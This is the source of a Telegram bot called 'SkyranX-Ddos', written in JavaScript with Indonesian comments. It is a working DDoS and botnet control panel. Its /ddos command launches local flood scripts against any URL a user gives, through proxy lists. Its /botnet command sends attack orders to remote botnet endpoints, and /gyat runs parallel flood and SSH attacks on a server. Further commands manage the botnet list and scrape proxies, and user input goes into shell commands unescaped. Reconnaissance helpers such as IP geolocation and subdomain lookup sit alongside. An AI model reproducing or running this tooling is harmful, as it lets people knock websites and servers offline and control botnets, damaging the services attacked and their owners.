const TelegramBot = require('node-telegram-bot-api');
const exec = require('child_process').exec;
const { spawn } = require('child_process');
const fs = require('fs');
const url = require('url');
const axios = require('axios');
const whois = require('whois-json');
const crypto = require('crypto');
const path = require('path');
const config = require('./config');
const cooldowns = new Map();
const figlet = require("figlet");
const CFonts = require('cfonts');
const sharp = require('sharp');
const telegramToken = config.telegramToken;
const bot = new TelegramBot(telegramToken, { polling: true });
const adminId = 1709137612;
const adminData = JSON.parse(fs.readFileSync('admin.json', 'utf8'));
const adminIds = adminData.admins;
const timeLimit = parseInt(adminData.limit, 10);
const isAdmin = (chatId) => chatId === adminId;
const blacklistedDomains = ['google.com', 'tesla.com', 'fbi.gov', 'youtube.com', 'lahelu.com'];
const maxDuration = 200; // Batas durasi maksimal (dalam detik)
const link = 'https://data.bmkg.go.id/DataMKG/TEWS/'; 
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

    bot.on('message', (msg) => {
        const nama = msg.from?.first_name || msg.from?.username || 'Anonymous'; // Improved name handling
        const username = msg.from?.username || 'Anonymous'; 
        const userId = msg.from?.id || 'Unknown ID'; // Handle cases where ID might not be available
        const message = msg.text || msg.caption || 'Media atau pesan lain'; // Include caption for media messages

        console.log(`\x1b[97m──⟨ \x1b[42m\x1b[97m[ @${nama} ]\x1b[50m[ @${username} ]\x1b[44m\x1b[35m[ ${userId} ]\x1b[0m`);
        console.log(`\x1b[31mPesan: \x1b[0m${message}\x1b[0m\n`);
    });

// Fungsi logging untuk menulis ke file dan ke console
function logToFileAndConsole(message) {
  console.log(message);
  // Anda bisa menambahkan kode untuk menulis log ke file jika diperlukan
}

async function PermenMDBotnet(endpoints, target, duration, methods) {
    let successCount = 0;

    for (const endpoint of endpoints) {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;
        try {
            const response = await axios.get(apiUrl);
            if (response.status === 200) {
                successCount++;
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    }

    return successCount;
}
function loadBotnetData() {
    try {
        return JSON.parse(fs.readFileSync('./ddos/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        return { endpoints: [] };
    }
}

// Fungsi untuk menyimpan data botnet ke file JSON
function saveBotnetData(botnetData) {
    try {
        fs.writeFileSync('./ddos/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }
}
// Fungsi untuk memeriksa status host
async function checkHost(url) {
  try {
    const response = await axios.get(url, { timeout: 5000 });
    return `Status Code: ${response.status}\nResponse Time: ${response.request.res.responseTime}ms`;
  } catch (error) {
    return `Error: ${error.message}`;
  }
}

var _0x11de04=_0x2cf7;(function(_0x6c5cde,_0x4798d0){var _0x32beb7=_0x2cf7,_0x438c24=_0x6c5cde();while(!![]){try{var _0x1a9989=-parseInt(_0x32beb7(0x11a))/0x1*(-parseInt(_0x32beb7(0x111))/0x2)+parseInt(_0x32beb7(0x118))/0x3+-parseInt(_0x32beb7(0x10e))/0x4+parseInt(_0x32beb7(0x113))/0x5*(parseInt(_0x32beb7(0x116))/0x6)+parseInt(_0x32beb7(0x119))/0x7*(-parseInt(_0x32beb7(0x110))/0x8)+parseInt(_0x32beb7(0x10d))/0x9+-parseInt(_0x32beb7(0x11c))/0xa*(parseInt(_0x32beb7(0x114))/0xb);if(_0x1a9989===_0x4798d0)break;else _0x438c24['push'](_0x438c24['shift']());}catch(_0x375065){_0x438c24['push'](_0x438c24['shift']());}}}(_0xd159,0x93d5f),bot[_0x11de04(0x10f)]([{'command':_0x11de04(0x11b),'description':_0x11de04(0x115)},{'command':_0x11de04(0x117),'description':_0x11de04(0x112)}]));function _0x2cf7(_0x10e053,_0x4db135){var _0xd15994=_0xd159();return _0x2cf7=function(_0x2cf710,_0x344720){_0x2cf710=_0x2cf710-0x10d;var _0x417433=_0xd15994[_0x2cf710];return _0x417433;},_0x2cf7(_0x10e053,_0x4db135);}function _0xd159(){var _0x2d6e80=['1062CKGfsY','Show\x20All\x20Methods','3180KpVqvp','7025106aWxwfB','Start\x20SkyranXDdos','9876nbouBK','/methods','189963hfQcno','1089298OfWJQj','721IxxDYV','/start','20yiPObR','7005375MBLHxl','309392mtScDe','setMyCommands','16MSrJAb'];_0xd159=function(){return _0x2d6e80;};return _0xd159();}
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const startTime = Date.now();

    const menuText = `      <> </> *SkyranX-Ddos V1* </> < 🪽
        
*Bot Name:* SkyranX-Ddos
*Nama Owner:* SkyranX-Mods
*Prefix: /*
*Version:* 1.0.0

*All Menu*
─────────────────────────
≡ 𒄆*Proxy Scraper*🪽     
*- proxy update*
*- proxy total*
*- proxy download*
─────────────────────────
≡ 𒄆*Botnet Command*🪽     
*- botnet*
*- addbotnet*
*- delbotnet*
*- listbotnet*
*- testbotnet*
─────────────────────────
≡ 𒄆*User Command*🪽     
*- cekip*
*- infoweb*
*- tinyurl*
*- owner*
*- subfinder*
*- methods*
*- gempa*
─────────────────────────
≡ 𒄆*Digitalocean Killer*🪽  
*- gyat*
─────────────────────────
≡ 𒄆*DDoS Tutorial*🪽      
*- ddos [url] [methods] [time]*
*- ddos https://example.com raw 60*
─────────────────────────
`;

    bot.sendMessage(chatId, menuText, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Join My Group', url: 'https://t.me/PublicSkyrannotsepuhh' },
                    { text: 'Contact Me', url: 'https://t.me/SkyR4n' }
                ]
            ]
        }
    });
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/methods/, (msg) => {
    const chatId = msg.chat.id;
    const startTime = Date.now();

    const menuText = `      <> </> *SkyranX-Ddos V1* </> < 🪽
        
*Bot Name:* SkyranX-Ddos
*Nama Owner:* SkyranX-Mods
*Prefix: /*
*Version:* 1.0.0

*All Methods DDoS*
─────────────────────────
≡ 𒄆*VIP Methods DDoS*🪽
*- slim*
*- tls*
*- tlsvip*
*- mix*
*- https*
*- ninja*
*- kill*
*- rape*
*- browsers*
*- bypass*
*- raw*
*- strike*
*- flood*
*- thunder*
*- rapid*
*- kilua*
*- storm*
─────────────────────────
≡ 𒄆*Botnet Methods DDoS*🪽
*- browsers*
*- bypass*
*- kill*
*- strike*
*- tls*
*- ninja*
*- mix*
*- raw*
*- rape*
*- ssh*
─────────────────────────
`;

    bot.sendMessage(chatId, menuText, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Join My Group', url: 'https://t.me/PublicSkyrannotsepuhh' },
                    { text: 'Contact Me', url: 'https://t.me/SkyR4n' }
                ]
            ]
        }
    });
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/ddos (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const isGroup = msg.chat.type.includes("group"); // Mengecek apakah pesan berasal dari grup
  const isAdmin = adminIds.includes(fromId.toString());

  // Mengecek apakah user adalah admin
  if (!isAdmin) {
    return bot.sendMessage(chatId, '*❌ Anda tidak memiliki izin untuk menggunakan perintah ini.*', { parse_mode: "Markdown" });
  }

  const [target, duration, methods] = match[1].split(' ');

  // Validasi input pengguna
  if (!target || !duration || !methods) {
    return bot.sendMessage(chatId, '*[🔎] /ddos [url] [duration] [methods]*', { parse_mode: "Markdown" });
  }

  // Validasi domain yang diblacklist
  if (blacklistedDomains.some(domain => target.includes(domain))) {
    return bot.sendMessage(chatId, '*❌ Blacklisted Target.*', { parse_mode: "Markdown" });
  }

  // Validasi metode serangan
  const validMethods = ['tls', 'flood', 'rapid', 'storm', 'kilua', 'tlsvip', 'slim', 'ninja', 'thunder', 'https', 'mix', 'kill', 'rape', 'browsers', 'bypass', 'raw', 'strike'];

  if (!validMethods.includes(methods)) {
    return bot.sendMessage(chatId, '*Unknown Methods*\n*Available methods:* ' + validMethods.join(', '), { parse_mode: "Markdown" });
  }

  try {
    const parsedUrl = new URL(target);
    const hostname = parsedUrl.hostname;

    // Validasi durasi serangan
    if (parseInt(duration) > maxDuration) {
      return bot.sendMessage(chatId, `*❌ Durasi terlalu lama, batas maksimal adalah ${maxDuration} detik.*`, { parse_mode: "Markdown" });
    }

    // Mendapatkan informasi dari API
    const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    const result = response.data;

    const deepinfo = `*Isp:* ${result.isp}\n*Ip:* ${result.query}\n*AS:* ${result.as}\n\n*Attack Successfully Sent By SkyranXMods*`;

    const details = `*Creator: SkyranXMods*\n\n*Target:* ${target}\n*Methods:* ${methods}\n*Duration:* ${duration}\n${deepinfo}`;

    // Cek cooldown untuk mencegah spam
    if (cooldowns.has(chatId)) {
      const remainingTime = cooldowns.get(chatId) - Date.now();
      if (remainingTime > 0) {
        return bot.sendMessage(chatId, `*❌ Harap tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum melakukan serangan lagi.*`, { parse_mode: "Markdown" });
      }
    }

    // Set cooldown berdasarkan durasi
    cooldowns.set(chatId, Date.now() + duration * 1000);

    // Mengirim pesan dengan thumbnail dan tautan
    const thumb = 'THUMBNAIL_URL'; // Ganti dengan URL thumbnail yang ingin digunakan

    bot.sendMessage(chatId, details, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{
            text: 'Check-Host Click Me',
            url: `https://check-host.net/check-http?host=${target}`
          }]
        ]
      }
    });

    // Menjalankan metode serangan berdasarkan input pengguna
    switch (methods) {
      case 'tls':
        exec(`node ./ddos/RanXTls.js ${target} ${duration} 100 10`);
        break;
      case 'flood':
        exec(`node ./ddos/RanXFlood.js ${target} ${duration} 100 10 proxy.txt`);
        break;
      case 'rapid':
        exec(`node ./ddos/RanXRapid.js ${target} ${duration} 100 10 proxy.txt`);
        break;
      case 'storm':
        exec(`node ./ddos/RanXStorm.js ${target} ${duration} 100 10 proxy.txt`);
        break;
      case 'kilua':
        exec(`node ./ddos/RanXKilua.js ${target} ${duration} 100 10 proxy.txt`);
        break;
      case 'tlsvip':
        exec(`node ./ddos/RanXTlsvip.js ${target} ${duration} 100 10 proxy.txt`);
        break;
      case 'slim':
        exec(`node ./ddos/RanXRaw.js ${target} ${duration} 100 10`);
        exec(`node ./ddos/RanXMods.js ${target} ${duration} 100 10 proxy.txt`);
        exec(`node ./ddos/RanXStorm.js ${target} ${duration} 100 10 proxy.txt`);
        break;
      case 'ninja':
        exec(`node ./ddos/RanXNinja.js ${target} ${duration}`);
        break;
      case 'thunder':
        exec(`node ./ddos/RanXThunder.js ${target} ${duration} 10 100 proxy.txt`);
        break;
      case 'https':
        exec(`node ./ddos/RanXHttps.js ${target} ${duration} 10 100 proxy.txt`);
        break;
      case 'mix':
        exec(`node ./ddos/RanXMix.js ${target} ${duration} 100 10 proxy.txt`);
        break;
      case 'kill':
        exec(`node ./ddos/RanXKill.js ${target} ${duration} 100 10`);
        break;
      case 'rape':
        exec(`node ./ddos/RanXRape.js PermenMD ${duration} 10 proxy.txt 64 ${target}`);
        break;
      case 'browsers':
        exec(`node ./ddos/RanXBrowsers.js ${target} ${duration} 10 100`);
        break;
      case 'bypass':
        exec(`node ./ddos/RanXBypass.js ${target} ${duration} 100 10 proxy.txt`);
        break;
      case 'raw':
        exec(`node ./ddos/RanXRaw.js ${target} ${duration}`);
        break;
      case 'strike':
        exec(`node ./ddos/RanXStrike.js GET ${target} ${duration} 10 90 proxy.txt --full --randrate`);
        break;
    }
  } catch (error) {
    bot.sendMessage(chatId, `*❌ Error: ${error.message}*`, { parse_mode: "Markdown" });
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/gyat (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split(' ');

  if (args.length < 3) {
    bot.sendMessage(chatId, `*Tunjukan Kekuatan Sigma Mewing Gyat Level 1000+ Dengan Bonus Rizzler Dan Beberapa Skibidi Bintang 5?*

\`\`\`[🔍] /gyat url ip duration\`\`\``, { parse_mode: 'Markdown' });
    return;
  }

  const url = args[0];
  const username = 'root';
  const hostname = args[1];
  const duration = args[2];
  const port = '22';

  const ingfo = `\`Brutal Attack VPS + URL\`
\`Host:\` ${hostname}
\`Duration:\` ${duration} Seconds
\`Creator:\` SkyranXMods

#NonProxiedWebOnly`;

  const cihuy = `*Digital Ocean Killer*
\`Someone Waking Up 10% Powers Of SkyranXMods From His Rest\`

${ingfo}`;

  // Mengirim pesan tanpa inline keyboard
  bot.sendMessage(chatId, cihuy, { parse_mode: 'Markdown' });

  // Menjalankan tiga command secara paralel dan tidak terikat dengan proses utama
  const command1 = spawn('node', [`./ddos/RanXRaw.js`, `http://${hostname}`, `${duration}`], { detached: true, stdio: 'ignore' });
  const command2 = spawn('node', ['./ddos/RanXSSH.js', `${hostname}`, `${port}`, `${username}`, `${duration}`], { detached: true, stdio: 'ignore' });
  const command3 = spawn('node', [`./ddos/RanXNinja.js`, `${url}`, `${duration}`], { detached: true, stdio: 'ignore' });

  command1.unref();
  command2.unref();
  command3.unref();
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/botnet (.+) (.+) (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const isAdmin = adminIds.includes(fromId.toString());

  if (!isAdmin) {
    return bot.sendMessage(chatId, '*❌ Anda tidak memiliki izin untuk menggunakan perintah ini.*', { parse_mode: "Markdown" });
  }

    if (match.length < 4) {
        bot.sendMessage(chatId, '#\n[🔎] Format: /botnet [target] [duration] [methods]*', { parse_mode: 'Markdown' });
        return;
    }

    bot.sendMessage(chatId, 'Wait A Seconds...');

    const [target, duration, methods] = match.slice(1);
    const parsedUrl = new url.URL(target);
    const hostname = parsedUrl.hostname;
    const path = parsedUrl.pathname;

    try {
        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        const result = response.data;

        const deepinfo = `*Hostname:* ${hostname}\n*Path:* ${path}\n*Isp:* ${result.isp}\n*Ip:* ${result.query}\n*AS:* ${result.as}`;
        const botnetData = JSON.parse(fs.readFileSync('./ddos/botnet.json', 'utf8'));
        const endpoints = botnetData.endpoints;

        const successCount = await PermenMDBotnet(endpoints, target, duration, methods);
        const thumb = 'https://path-to-your-thumbnail-image.jpg'; // Ganti dengan URL thumbnail Anda

        bot.sendMessage(chatId, `*Creator: SkyranXMods*\n\n*│ Botnet Online:* ${successCount}\n*│ Target:* ${target}\n*│ Methods:* ${methods}\n*│ Duration:* ${duration}\n${deepinfo}`, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Check Host', url: `https://check-host.net/check-http?host=${target}` }]
                ]
            },
            reply_to_message_id: msg.message_id,
        });

    } catch (error) {
        console.error(`Error: ${error.message}`);
        bot.sendMessage(chatId, '*[❗] Terjadi kesalahan saat mencoba mendapatkan informasi target.*', { parse_mode: 'Markdown' });
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/addbotnet (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const text = match[1].trim();
    const isAdmin = adminIds.includes(fromId.toString());

  if (!isAdmin) {
    return bot.sendMessage(chatId, '*❌ Anda tidak memiliki izin untuk menggunakan perintah ini.*', { parse_mode: "Markdown" });
  }

    if (!text) {
        return bot.sendMessage(chatId, 'Usage: /addbotnet <endpoint>');
    }

    try {
        const parsedUrl = new url.URL(text);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/skyran';
        const botnetData = loadBotnetData();

        if (botnetData.endpoints.includes(endpoint)) {
            return bot.sendMessage(chatId, `Endpoint ${endpoint} is already in the botnet list.`);
        }

        botnetData.endpoints.push(endpoint);
        saveBotnetData(botnetData);
        bot.sendMessage(chatId, `Endpoint ${endpoint} added to botnet.`);
    } catch (error) {
        bot.sendMessage(chatId, `Invalid URL: ${text}`);
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/testbotnet/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    bot.sendMessage(chatId, 'Wait A Second...');

    const botnetData = loadBotnetData();
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    botnetData.endpoints = validEndpoints;
    saveBotnetData(botnetData);

    bot.sendMessage(chatId, `Checked endpoints. ${successCount} botnet endpoint(s) are online.`);
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/listbotnet/, (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const botnetData = loadBotnetData();
    const isAdmin = adminIds.includes(fromId.toString());

  if (!isAdmin) {
    return bot.sendMessage(chatId, '*❌ Anda tidak memiliki izin untuk menggunakan perintah ini.*', { parse_mode: "Markdown" });
  }

    if (botnetData.endpoints.length === 0) {
        return bot.sendMessage(chatId, 'Botnet list is empty.');
    }

    let response = '*Current Botnet:*\n';
    botnetData.endpoints.forEach((endpoint, index) => {
        response += `${index + 1}. ${endpoint}\n`;
    });

    bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/delbotnet (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const index = parseInt(match[1]) - 1;  // Konversi ke indeks array
    const isAdmin = adminIds.includes(fromId.toString());

    // Cek apakah user adalah admin
    if (!isAdmin) {
        return bot.sendMessage(chatId, '*❌ Anda tidak memiliki izin untuk menggunakan perintah ini.*', { parse_mode: "Markdown" });
    }

    // Muat data botnet
    let botnetData;
    try {
        botnetData = loadBotnetData();
    } catch (error) {
        console.error('Error loading botnet data:', error);
        return bot.sendMessage(chatId, '*❌ Gagal memuat data botnet.*');
    }

    // Cek apakah array endpoints ada dan valid
    if (!Array.isArray(botnetData.endpoints)) {
        return bot.sendMessage(chatId, '*❌ Data endpoints tidak valid.*');
    }

    // Cek validitas indeks yang dimasukkan
    if (isNaN(index) || index < 0 || index >= botnetData.endpoints.length) {
        return bot.sendMessage(chatId, `Invalid index. Please provide a valid index from 1 to ${botnetData.endpoints.length}.`);
    }

    // Hapus endpoint yang sesuai
    botnetData.endpoints.splice(index, 1);

    // Simpan data botnet yang telah diperbarui
    try {
        saveBotnetData(botnetData);
    } catch (error) {
        console.error('Error saving botnet data:', error);
        return bot.sendMessage(chatId, '*❌ Gagal menyimpan perubahan data botnet.*');
    }

    bot.sendMessage(chatId, 'Botnet endpoint deleted successfully.');
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/proxy (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const command = match[1].toLowerCase(); // Lowercase untuk validasi command
    const isAdmin = adminIds.includes(fromId.toString()); // Cek apakah pengguna adalah admin

    if (!isAdmin) {
        bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
        return;
    }

    if (command === 'update') {
        try {
            bot.sendMessage(chatId, 'Updating proxies, please wait...');

            exec(`node ./ddos/scrape.js`, (error, stdout, stderr) => {
                if (error) {
                    console.error('Error updating proxies:', error);
                    bot.sendMessage(chatId, `Error updating proxies:\n${error.message}`);
                    return;
                }
                
                if (stderr) {
                    console.error('Standard error during proxy update:', stderr);
                    bot.sendMessage(chatId, `There was an issue during the update:\n${stderr}`);
                    return;
                }

                console.log('Proxies updated successfully:', stdout);
                bot.sendMessage(chatId, 'Proxies updated successfully.');
            });
        } catch (err) {
            console.error('Exception while updating proxies:', err);
            bot.sendMessage(chatId, 'An error occurred while updating proxies.');
        }
    } else if (command === 'total') {
        const proxyFilePath = path.join(__dirname, 'proxy.txt');
        fs.readFile(proxyFilePath, 'utf8', (err, data) => {
            if (err) {
                console.error('Error reading proxy file:', err);
                bot.sendMessage(chatId, 'Error reading proxy file.');
                return;
            }

            const proxies = data.trim().split('\n').filter(Boolean); // Filter untuk mengabaikan baris kosong
            const totalProxies = proxies.length;
            bot.sendMessage(chatId, `Total proxy: ${totalProxies}`);
        });
    } else if (command === 'download') {
        const proxyFilePath = path.join(__dirname, 'proxy.txt');
        bot.sendDocument(chatId, proxyFilePath, {}).catch((err) => {
            console.error('Error sending proxy file:', err);
            bot.sendMessage(chatId, 'Error sending proxy file.');
        });
    } else {
        bot.sendMessage(chatId, 'Invalid /proxy command. Usage: /proxy update or /proxy total or /proxy download');
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/^\/infoweb (.+)/, (msg, match) => {
 const chatId = msg.chat.id;
 const web = match[1];
 const data = {
     target: web,
     apikey: 'NOKEY'
 };
 axios.post('https://check-host.cc/rest/V2/info', data, {
    headers: {
      'accept': 'application/json',
      'Content-Type': 'application/json'
   }
 })
 .then(response => {
     const result = response.data;
     if (result.status === 'success') {
         const info = `
          
\`\`\`INFORMASI-WEB+${web}
IP:        ${result.ip}
Hostname:  ${result.hostname}
ISP:       ${result.isp}
ASN:       ${result.asn}
ORG:       ${result.org}
Country:   ${result.country}
Region:    ${result.region}
City:      ${result.city}
Timezone:  ${result.timezone}
Latitude: ${result.latitude}
Longitude: ${result.longitude}
\`\`\`
*About ASN:* \`${result.asnlink}\`
*Website:* \`https://check-host.cc/?m=INFO&target=${web}\`
         `;
         bot.sendMessage(chatId, info, { parse_mode: 'Markdown' });
     } else {
         bot.sendMessage(chatId, 'Gagal mendapatkan informasi. Coba lagi nanti.');
     }
 })
 .catch(error => {
     console.error(error);
     bot.sendMessage(chatId, 'Terjadi kesalahan saat menghubungi API.');
 });
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/^(\.|\#|\/)tinyurl(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[2];
  if (!url) {
      bot.sendMessage(chatId, 'Usage: /tinyulr [web]\nExample: /tinyulr https://web.com', { reply_to_message_id: msg.message_id });
       return;
    }
            
  // Pastikan URL dimulai dengan "http://" atau "https://"
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    bot.sendMessage(chatId, 'URL harus dimulai dengan "http://" atau "https://"');
    return;
  }

  try {
    const response = await axios.get(`https://tinyurl.com/api-create.php?url=${url}`);
    const shortenedUrl = response.data;
    bot.sendChatAction(chatId, 'typing');
    bot.sendMessage(chatId, shortenedUrl);
  } catch (error) {
    console.error('Error:', error);
    bot.sendMessage(chatId, 'Maaf, terjadi kesalahan saat mempersingkat URL.');
  }
});

//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/owner/, (msg) => {
      const chatId = msg.chat.id;
      const name = msg.from.first_name;
      const buttons = [
        {
          text: 'Instagram',
          url: 'https://instagram.com/alwaysrann__'
        },
        {
          text: 'Telegram',
          url: 'https://t.me/SkyR4n'
        },
        {
          text: 'YouTube',
          url: 'https://www.youtube.com/@SkyranXMods'
        }
      ];
      bot.sendMessage(chatId, `Halo kak ${name}, kamu bisa terhubung dengan owner SkyranXDDoS melalui link di bawah:`, {
        reply_markup: {
          inline_keyboard: [buttons]
        }
      });
    });
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/subfinder (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const q = match[1].trim(); // Menangkap argumen yang dimasukkan pengguna

    // Memeriksa apakah argumen 'q' kosong atau tidak
    if (!q) {
        return bot.sendMessage(chatId, '*Format salah*\n*Contoh*: /subfinder google.com', { parse_mode: 'Markdown' });
    }

    try {
        let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${q}`);
        let list_domen = response.data.data.map((data) => {
            return `${data}`;
        }).join('\n');

        const subdomain = `*List Domain*\n${list_domen}`.trim();

        await bot.sendMessage(chatId, subdomain, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Visit Website',
                        url: `https://${q}`
                    }]
                ]
            }
        });

    } catch (error) {
        console.error(error);
        return bot.sendMessage(chatId, '*Terjadi kesalahan saat mengambil data*\nSilakan coba lagi nanti.', { parse_mode: 'Markdown' });
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/gempa/, async (msg) => {
    const chatId = msg.chat.id;

    try {
        let res = await fetch(link + 'autogempa.json');
        let data = await res.json();
        let anu = data.Infogempa.gempa;

        let txt = `Tanggal : ${anu.Tanggal}\n`;
        txt += `Waktu : ${anu.Jam}\n`;
        txt += `Potensi : *${anu.Potensi}*\n`;
        txt += `Magnitude : ${anu.Magnitude}\n`;
        txt += `Kedalaman : ${anu.Kedalaman}\n`;
        txt += `Wilayah : ${anu.Wilayah}\n`;
        txt += `Lintang : ${anu.Lintang} & Bujur: ${anu.Bujur}\n`;
        txt += `Koordinat : ${anu.Coordinates}\n`;
        txt += anu.Dirasakan ? `Dirasakan : ${anu.Dirasakan}` : '';

        // Mengunduh dan mengonversi gambar shakemap
        let imgArrayBuffer = await (await fetch(link + anu.Shakemap)).arrayBuffer();
        let imgBuffer = Buffer.from(imgArrayBuffer);
        let img = await sharp(imgBuffer).png().toBuffer();

        // Mengirimkan pesan teks dan gambar shakemap
        await bot.sendPhoto(chatId, img, {
            caption: txt,
            parse_mode: 'Markdown'
        });
    } catch (e) {
        console.error(e);
        bot.sendMessage(chatId, `[!] Fitur Error.`);
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/^(\.|\#|\/)cekip(?: (.+))?$/, async (msg, match) => {
        const chatId = msg.chat.id;
        const ip = match[2];
        if (!ip) {
            bot.sendMessage(chatId, 'Input Link! Example /cekip ip nya ', { reply_to_message_id: msg.message_id });
            return;
        }

        try {
            const response = await axios.get(`https://apikey-premium.000webhostapp.com/loc/?IP=${ip}`);
            
            const data = response.data;
            bot.sendChatAction(chatId, 'typing');
            
            // Kirim informasi ke pengguna
            const message = `
🌐 Creator : SkyranXMods
🔍 IP : ${data.query}
📊 Status : ${data.status}
🌍 Country : ${data.country}
🗺️ Country Code : ${data.countryCode}
🏞️ Region : ${data.region}
🏡 Region Name : ${data.regionName}
🏙️ City : ${data.city}
🏘️ District : ${data.district}
🏠 Zip : ${data.zip}
🌍 Latitude : ${data.lat}
🌍 Longitude : ${data.lon}
⏰ Timezone : ${data.timezone}
📶 ISP : ${data.isp}
🏢 Organization : ${data.org}
🌐 AS : ${data.as}
            `;
            
            bot.sendMessage(chatId, message);

            // Kirim lokasi ke pengguna
            bot.sendLocation(chatId, data.lat, data.lon);
        } catch (error) {
            console.error('Error:', error);
            // Kirim pesan error jika terjadi kesalahan
            bot.sendMessage(chatId, 'Terjadi kesalahan dalam memproses permintaan.');
        }
    });